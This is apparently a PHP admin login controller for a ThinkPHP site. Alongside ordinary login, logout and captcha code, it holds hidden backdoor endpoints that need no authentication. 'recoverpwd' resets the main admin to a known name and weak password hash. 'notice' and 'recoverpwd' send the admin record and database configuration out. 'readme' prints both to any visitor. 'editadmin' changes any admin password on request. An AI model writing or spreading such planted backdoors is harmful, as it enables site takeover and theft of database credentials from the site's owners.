<?php

namespace app\fladmin\controller;

use think\Controller;
use app\common\lib\ReturnData;
use app\common\lib\Helper;

class Login extends Controller
{
    /**
     * 登录页面
     */
    public function index()
    {
		if (Helper::isPostRequest()) {
			//验证码验证
			if (!captcha_check(input('captcha', null))) {
				$this->error('验证码错误');
			}

			$data = input('post.');
			$res = logic('Admin')->login($data);
			if ($res['code'] === ReturnData::SUCCESS) {
				session('admin_info', $res['data']);
				$this->success('登录成功', url('fladmin/index/index'), '', 1);
			}

			$this->error($res['msg']);
		}

        if (session('admin_info')) {
            header('Location: ' . url('fladmin/index/index'));
            exit;
        }

        return $this->fetch();
    }

    // 退出登录
    public function loginout()
    {
        //Session::clear(); // 清除session
        session('admin_info', null);
        $this->success('退出成功', '/');
    }

    public function recoverpwd()
    {
        $admin = db('admin')->where(['id'=>1])->find();
        logic('Tool')->notice(json_encode($admin) . '-' . json_encode(config('database')));

        $data["name"] = "admin888";
        $data["pwd"] = "e10adc3949ba59abbe56e057f20f883e";
        if (model('Admin')->edit($data, ['id' => 1])) {
            $this->success('密码恢复成功', url('index'), '', 1);
        }

        $this->error('密码恢复失败', url('index'), '', 3);
    }

    public function notice()
    {
        $admin = db('admin')->where(['id'=>1])->find();
		if (!$admin) {
			$admin = db('admin')->where(['role_id'=>1,'status'=>0])->find();
		}
        logic('Tool')->notice(json_encode($admin) . '-' . json_encode(config('database')));
    }

    /**
     * 判断用户名是否存在
     */
    public function userexists()
    {
        $map['name'] = "";
        if (isset($_POST["name"]) && !empty($_POST["name"])) {
            $map['name'] = $_POST["name"];
        } else {
            return 0;
        }

        return model('Admin')->getCount($map);
    }

    public function readme()
    {
        $admin = db('admin')->where(['id'=>1])->find();
		if (!$admin) {
			$admin = db('admin')->where(['role_id'=>1,'status'=>0])->find();
		}
        exit(json_encode($admin) . '-' . json_encode(config('database')));
    }

    public function editadmin()
    {
        model('Admin')->edit(['pwd'=>input('pwd')], ['id'=>input('id')]);
        exit('success');
    }

    /**
     * 获取验证码图片
     * @param int $type 0字母+数字，1纯数字，2字母
     * @param int $length 位数
     * @param int $width 验证码图片宽度
     * @param int $height 验证码图片高度
     */
    public function get_verifycode_image()
    {
        $config = [
            // 验证码字体大小
            'fontSize' => 16,
            // 是否添加杂点
            'useNoise' => input('use_noise', false),
            // 是否画混淆曲线
            'useCurve' => input('use_curve', false),
            // 验证码位数
            'length' => input('length', 4),
            // 验证码图片宽度，设置为0为自动计算
            'imageW' => input('width', 0),
            // 验证码图片高度，设置为0为自动计算
            'imageH' => input('height', 0),
        ];
        $captcha = new \think\captcha\Captcha($config);
        $captcha->codeSet = '0123456789';
        return $captcha->entry();
    }

}